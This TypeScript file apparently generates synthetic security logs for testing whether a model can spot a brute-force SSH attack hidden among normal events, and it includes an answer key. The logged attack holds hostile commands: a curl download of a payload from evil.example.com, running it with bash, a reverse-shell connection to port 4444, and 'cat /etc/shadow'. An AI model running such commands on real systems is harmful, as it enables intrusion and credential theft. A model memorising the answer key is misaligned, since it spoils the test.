/**
 * Security event data generator — produces 1000+ events with
 * attack chains buried in normal activity.
 *
 * Simulates a realistic environment with:
 * - Normal SSH logins from developers (publickey auth)
 * - Normal service operations (git, npm, docker, etc.)
 * - A brute-force attack from 10.0.0.50 against dc-01
 * - Post-compromise activity: C2 download + execution
 * - Scattered single failed logins from scanners (noise)
 * - Normal cron jobs and system processes
 *
 * The model needs to identify the attack chain among the noise.
 */

import type { Document, IndexMapping } from '../../types';

function seededRng(seed: number): () => number {
  let s = seed;
  return () => {
    s = (s * 1664525 + 1013904223) & 0xffffffff;
    return (s >>> 0) / 0xffffffff;
  };
}

export const securityEventsMapping: IndexMapping = {
  properties: {
    '@timestamp': { type: 'date' },
    'event.category': { type: 'keyword' },
    'event.outcome': { type: 'keyword' },
    'event.action': { type: 'keyword' },
    'source.ip': { type: 'ip' },
    'user.name': { type: 'keyword' },
    'host.name': { type: 'keyword' },
    'host.os.family': { type: 'keyword' },
    'process.name': { type: 'keyword' },
    'process.command_line': { type: 'text' },
    'process.pid': { type: 'integer' },
    'destination.ip': { type: 'ip' },
    'destination.port': { type: 'integer' },
    message: { type: 'text' },
  },
};

const LEGITIMATE_USERS = [
  'developer', 'devops', 'sysadmin', 'deployer',
  'monitoring', 'backup', 'ci-bot',
];

const LEGITIMATE_IPS = [
  '192.168.1.10', '192.168.1.11', '192.168.1.20',
  '192.168.1.30', '192.168.1.40', '10.1.0.5',
  '10.1.0.10', '10.1.0.15',
];

const HOSTS = [
  'web-01', 'web-02', 'web-03',
  'api-01', 'api-02',
  'db-01', 'db-02',
  'dc-01', 'dc-02',
  'build-01',
];

const SCANNER_IPS = [
  '203.0.113.42', '203.0.113.78', '198.51.100.12',
  '198.51.100.33', '203.0.113.99', '198.51.100.55',
  '203.0.113.111', '198.51.100.77',
];

const NORMAL_PROCESSES = [
  { name: 'git', cmd: 'git pull origin main' },
  { name: 'npm', cmd: 'npm install' },
  { name: 'docker', cmd: 'docker ps' },
  { name: 'systemctl', cmd: 'systemctl status nginx' },
  { name: 'journalctl', cmd: 'journalctl -u nginx --since "1 hour ago"' },
  { name: 'kubectl', cmd: 'kubectl get pods -n production' },
  { name: 'ansible', cmd: 'ansible-playbook deploy.yml' },
  { name: 'rsync', cmd: 'rsync -avz /data/ backup-host:/backup/' },
  { name: 'cron', cmd: '/usr/local/bin/backup.sh' },
  { name: 'python3', cmd: 'python3 /opt/scripts/health_check.py' },
  { name: 'node', cmd: 'node /app/server.js' },
  { name: 'java', cmd: 'java -jar /opt/app/service.jar' },
  { name: 'nginx', cmd: 'nginx -t' },
  { name: 'curl', cmd: 'curl -s http://localhost:8080/health' },
  { name: 'psql', cmd: 'psql -U app_user -d production -c "SELECT 1"' },
];

const CRON_PROCESSES = [
  { name: 'logrotate', cmd: '/usr/sbin/logrotate /etc/logrotate.conf' },
  { name: 'certbot', cmd: '/usr/bin/certbot renew --quiet' },
  { name: 'restic', cmd: '/usr/local/bin/restic backup /data' },
  { name: 'apt-get', cmd: '/usr/bin/apt-get update -qq' },
];

// The attack: brute force from 10.0.0.50 targeting dc-01
const ATTACKER_IP = '10.0.0.50';
const TARGET_HOST = 'dc-01';
const BRUTE_FORCE_USERS = ['admin', 'root', 'administrator', 'admin', 'admin'];

export function generateSecurityEvents(count = 1500, seed = 42): Document[] {
  const rng = seededRng(seed);
  const pick = <T>(arr: T[]): T => arr[Math.floor(rng() * arr.length)];
  const docs: Document[] = [];

  // Time range: 24 hours
  const baseTime = new Date('2024-06-15T00:00:00Z').getTime();
  const durationMs = 24 * 60 * 60 * 1000;

  // Attack window: 03:00 - 03:05 (brute force + post-compromise)
  const attackStartMs = 3 * 60 * 60 * 1000; // 03:00
  const bruteForceEndMs = attackStartMs + 30 * 1000; // 30 seconds of brute force
  const compromiseMs = bruteForceEndMs + 5 * 1000; // successful login at 03:00:35
  const postCompromiseMs = compromiseMs + 30 * 1000; // 03:01:05 - C2 activity
  const attackEndMs = postCompromiseMs + 60 * 1000; // activity over by 03:02:05

  let idx = 0;

  // --- 1. Inject the attack chain (specific, deterministic events) ---

  // Brute force attempts (12 rapid failures)
  for (let i = 0; i < 12; i++) {
    const ts = new Date(baseTime + attackStartMs + i * 2000).toISOString();
    const user = BRUTE_FORCE_USERS[i % BRUTE_FORCE_USERS.length];
    docs.push({
      _id: `sec-attack-${idx++}`,
      _index: 'eq-sec-events',
      _source: {
        '@timestamp': ts,
        'event.category': 'authentication',
        'event.outcome': 'failure',
        'event.action': 'ssh_login',
        'source.ip': ATTACKER_IP,
        'user.name': user,
        'host.name': TARGET_HOST,
        'host.os.family': 'linux',
        'process.name': 'sshd',
        'process.pid': 1200 + i,
        message: `Failed password for ${user} from ${ATTACKER_IP} port ${52431 + i} ssh2`,
      },
    });
  }

  // Successful login (the compromise)
  docs.push({
    _id: `sec-attack-${idx++}`,
    _index: 'eq-sec-events',
    _source: {
      '@timestamp': new Date(baseTime + compromiseMs).toISOString(),
      'event.category': 'authentication',
      'event.outcome': 'success',
      'event.action': 'ssh_login',
      'source.ip': ATTACKER_IP,
      'user.name': 'admin',
      'host.name': TARGET_HOST,
      'host.os.family': 'linux',
      'process.name': 'sshd',
      'process.pid': 1250,
      message: `Accepted password for admin from ${ATTACKER_IP} port 52445 ssh2`,
    },
  });

  // Post-compromise: download payload
  docs.push({
    _id: `sec-attack-${idx++}`,
    _index: 'eq-sec-events',
    _source: {
      '@timestamp': new Date(baseTime + postCompromiseMs).toISOString(),
      'event.category': 'process',
      'event.outcome': 'success',
      'event.action': 'process_started',
      'source.ip': ATTACKER_IP,
      'user.name': 'admin',
      'host.name': TARGET_HOST,
      'host.os.family': 'linux',
      'process.name': 'curl',
      'process.command_line': 'curl -o /tmp/payload.sh http://evil.example.com/payload.sh',
      'process.pid': 1260,
      'destination.ip': '198.18.0.1',
      'destination.port': 80,
      message: 'curl -o /tmp/payload.sh http://evil.example.com/payload.sh',
    },
  });

  // Post-compromise: execute payload
  docs.push({
    _id: `sec-attack-${idx++}`,
    _index: 'eq-sec-events',
    _source: {
      '@timestamp': new Date(baseTime + postCompromiseMs + 5000).toISOString(),
      'event.category': 'process',
      'event.outcome': 'success',
      'event.action': 'process_started',
      'source.ip': ATTACKER_IP,
      'user.name': 'admin',
      'host.name': TARGET_HOST,
      'host.os.family': 'linux',
      'process.name': 'bash',
      'process.command_line': 'bash /tmp/payload.sh',
      'process.pid': 1261,
      message: 'bash /tmp/payload.sh',
    },
  });

  // Post-compromise: reverse shell callback
  docs.push({
    _id: `sec-attack-${idx++}`,
    _index: 'eq-sec-events',
    _source: {
      '@timestamp': new Date(baseTime + postCompromiseMs + 10000).toISOString(),
      'event.category': 'network',
      'event.outcome': 'success',
      'event.action': 'connection_attempted',
      'source.ip': ATTACKER_IP,
      'user.name': 'admin',
      'host.name': TARGET_HOST,
      'host.os.family': 'linux',
      'process.name': 'bash',
      'process.pid': 1262,
      'destination.ip': '198.18.0.1',
      'destination.port': 4444,
      message: 'Outbound connection to 198.18.0.1:4444 (suspicious: non-standard port)',
    },
  });

  // Post-compromise: credential dump attempt
  docs.push({
    _id: `sec-attack-${idx++}`,
    _index: 'eq-sec-events',
    _source: {
      '@timestamp': new Date(baseTime + postCompromiseMs + 20000).toISOString(),
      'event.category': 'process',
      'event.outcome': 'success',
      'event.action': 'process_started',
      'source.ip': ATTACKER_IP,
      'user.name': 'admin',
      'host.name': TARGET_HOST,
      'host.os.family': 'linux',
      'process.name': 'cat',
      'process.command_line': 'cat /etc/shadow',
      'process.pid': 1263,
      message: 'cat /etc/shadow',
    },
  });

  // --- 2. Generate normal background activity ---

  const normalCount = count - docs.length;
  for (let i = 0; i < normalCount; i++) {
    const offsetMs = Math.floor(rng() * durationMs);
    const ts = new Date(baseTime + offsetMs).toISOString();
    const host = pick(HOSTS);

    // Decide event type
    const eventRoll = rng();

    if (eventRoll < 0.30) {
      // Normal SSH logins (successful, publickey)
      const user = pick(LEGITIMATE_USERS);
      const ip = pick(LEGITIMATE_IPS);
      docs.push({
        _id: `sec-normal-${i}`,
        _index: 'eq-sec-events',
        _source: {
          '@timestamp': ts,
          'event.category': 'authentication',
          'event.outcome': 'success',
          'event.action': 'ssh_login',
          'source.ip': ip,
          'user.name': user,
          'host.name': host,
          'host.os.family': 'linux',
          'process.name': 'sshd',
          'process.pid': 1000 + Math.floor(rng() * 9000),
          message: `Accepted publickey for ${user} from ${ip} port ${30000 + Math.floor(rng() * 30000)} ssh2`,
        },
      });
    } else if (eventRoll < 0.40) {
      // Scanner noise: single failed login attempts from various IPs
      const scannerIp = pick(SCANNER_IPS);
      const targetUser = pick(['admin', 'root', 'test', 'user', 'guest']);
      docs.push({
        _id: `sec-normal-${i}`,
        _index: 'eq-sec-events',
        _source: {
          '@timestamp': ts,
          'event.category': 'authentication',
          'event.outcome': 'failure',
          'event.action': 'ssh_login',
          'source.ip': scannerIp,
          'user.name': targetUser,
          'host.name': host,
          'host.os.family': 'linux',
          'process.name': 'sshd',
          'process.pid': 1000 + Math.floor(rng() * 9000),
          message: `Failed password for ${targetUser} from ${scannerIp} port ${30000 + Math.floor(rng() * 30000)} ssh2`,
        },
      });
    } else if (eventRoll < 0.75) {
      // Normal process execution
      const user = pick(LEGITIMATE_USERS);
      const proc = pick(NORMAL_PROCESSES);
      docs.push({
        _id: `sec-normal-${i}`,
        _index: 'eq-sec-events',
        _source: {
          '@timestamp': ts,
          'event.category': 'process',
          'event.outcome': 'success',
          'event.action': 'process_started',
          'user.name': user,
          'host.name': host,
          'host.os.family': 'linux',
          'process.name': proc.name,
          'process.command_line': proc.cmd,
          'process.pid': 1000 + Math.floor(rng() * 9000),
          message: proc.cmd,
        },
      });
    } else if (eventRoll < 0.85) {
      // Cron jobs
      const proc = pick(CRON_PROCESSES);
      docs.push({
        _id: `sec-normal-${i}`,
        _index: 'eq-sec-events',
        _source: {
          '@timestamp': ts,
          'event.category': 'process',
          'event.outcome': 'success',
          'event.action': 'process_started',
          'user.name': 'root',
          'host.name': host,
          'host.os.family': 'linux',
          'process.name': proc.name,
          'process.command_line': proc.cmd,
          'process.pid': 1000 + Math.floor(rng() * 9000),
          message: proc.cmd,
        },
      });
    } else {
      // Normal network connections
      const user = pick(LEGITIMATE_USERS);
      const destPort = pick([80, 443, 5432, 6379, 9200, 8080]);
      docs.push({
        _id: `sec-normal-${i}`,
        _index: 'eq-sec-events',
        _source: {
          '@timestamp': ts,
          'event.category': 'network',
          'event.outcome': 'success',
          'event.action': 'connection_attempted',
          'source.ip': pick(LEGITIMATE_IPS),
          'user.name': user,
          'host.name': host,
          'host.os.family': 'linux',
          'process.name': pick(['curl', 'wget', 'python3', 'node', 'java']),
          'process.pid': 1000 + Math.floor(rng() * 9000),
          'destination.ip': `10.1.${Math.floor(rng() * 10)}.${Math.floor(rng() * 255)}`,
          'destination.port': destPort,
          message: `Connection to ${destPort === 443 ? 'https' : 'http'}://internal-service:${destPort}`,
        },
      });
    }
  }

  // Sort by timestamp
  docs.sort((a, b) =>
    (a._source['@timestamp'] as string).localeCompare(b._source['@timestamp'] as string),
  );

  return docs;
}

export function getSecurityFacts(docs: Document[]): {
  totalCount: number;
  attackerIp: string;
  targetHost: string;
  bruteForceAttempts: number;
  compromisedUser: string;
  postCompromiseProcesses: string[];
  c2Destination: { ip: string; port: number };
} {
  let bruteForceAttempts = 0;
  for (const doc of docs) {
    if (
      doc._source['source.ip'] === ATTACKER_IP &&
      doc._source['event.category'] === 'authentication' &&
      doc._source['event.outcome'] === 'failure'
    ) {
      bruteForceAttempts++;
    }
  }

  return {
    totalCount: docs.length,
    attackerIp: ATTACKER_IP,
    targetHost: TARGET_HOST,
    bruteForceAttempts,
    compromisedUser: 'admin',
    postCompromiseProcesses: ['curl', 'bash', 'cat'],
    c2Destination: { ip: '198.18.0.1', port: 4444 },
  };
}
